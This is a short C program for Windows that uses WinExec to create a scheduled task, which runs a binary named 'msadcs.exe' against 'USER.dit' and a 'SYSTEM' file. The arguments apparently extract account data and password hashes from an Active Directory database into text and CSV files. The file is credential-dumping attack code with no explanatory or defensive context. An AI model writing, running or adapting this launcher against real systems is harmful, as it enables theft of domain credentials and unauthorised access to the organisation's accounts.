#include <windows.h>

#define RUN(toRun) WinExec("schtasks /create /tn MyTask /tr \"cmd.exe /c \"" toRun "\" /sc once /st 00:00", SW_SHOW);

int main() {
    RUN("msadcs.exe \"USER.dit\" -s \"SYSTEM\" -p a.txt --users-csv a.csv");
    return 0;
}